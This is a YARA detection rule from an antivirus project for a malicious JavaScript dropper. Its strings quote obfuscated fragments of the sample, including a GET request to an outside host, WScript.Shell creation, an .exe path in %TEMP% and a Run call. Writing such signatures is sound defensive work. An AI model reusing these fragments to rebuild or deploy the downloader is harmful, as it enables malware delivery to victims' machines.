rule sig_20160401_e5379219c8ef90c316a5f6b0d2a285a2 {
  meta:
    description = "datamaliciousorder - file 20160401_e5379219c8ef90c316a5f6b0d2a285a2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dd5c30a7b10f0cdc8c8c66468ef5743db321937443239bd850c661edd5630b3a"

  strings:
    $s1  = "RsuZc[PhhEa](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "var MnJjt = function PdIth() {return WScript[PjRf](\"WScript\"+\".Shell\");}(), JifKei = 11;" fullword ascii
    $s3  = "function PbEk(WwhYzi, HhmLtu){MrwPr = MrwPr * 1; return WwhYzi - HhmLtu;};" fullword ascii
    $s4  = "if (RsuZc[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QjUxa() {return MnJjt[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"IQvQGWkb.ex\" + \"e\";};" fullword ascii
    $s6  = "function PnkPvj(){return OzqJvz + \"\";};" fullword ascii
    $s7  = "function WvkWl() {return ((YanMyr == true) && (YanMyr == IaZg)) ? 1 : MrwPr;};" fullword ascii
    $s8  = "return PbEk(ClZfx, DjdIm);" fullword ascii
    $s9  = "}while (TlIyz);" fullword ascii
    $s10 = "var YanMyr = false;" fullword ascii
    $s11 = "function XhOy(MaIgg){MnJjt[\"R\"+\"un\"](MaIgg, MrwPr, MrwPr);};" fullword ascii
    $s12 = "IaZg = true; " fullword ascii
    $s13 = "var BxfFbv = false;" fullword ascii
    $s14 = "YanMyr = true; " fullword ascii
    $s15 = "function EbjAv(TgxQl) {var DdXs = (1, 2, 3, 4, 5, TgxQl); return DdXs;};" fullword ascii
    $s16 = "var IaZg = false;" fullword ascii
    $s17 = "function AmyNsb(){return PjRf;};" fullword ascii
    $s18 = "function JoKpy(){return 23;};" fullword ascii
    $s19 = "function WeOi()" fullword ascii
    $s20 = "var GbpRar = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}